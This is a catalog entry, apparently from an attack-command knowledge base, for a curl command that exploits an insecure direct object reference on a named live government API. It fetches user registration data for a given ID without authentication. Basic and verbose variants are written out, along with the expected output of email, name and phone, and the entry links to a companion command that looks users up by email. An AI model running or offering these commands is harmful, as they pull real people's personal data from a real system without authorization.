---
id: uuid-curl-id-cmd-1
data: >-
  curl
  "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/"
tags:
  - api
  - fetch
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.847Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-user-by-id

## Command

```bash
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/"
```

## Description

Fetches user registration data for ID 4750 from the vulnerable API without authentication, demonstrating improper authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full API endpoint with ID | Yes |

## Examples

### Basic Usage

```bash
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/"
```

### Advanced Usage

```bash
curl -v "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/" -o output.json
```

## Expected Output

JSON response with user details: {"email":"example@domain.com","fullName":"John Doe","phone":"123-456-7890"}

## Related

- [[commands/curl-fetch-user-by-email]]
- [[procedures/Fetch-User-Data-via-Curl-with-ID]]
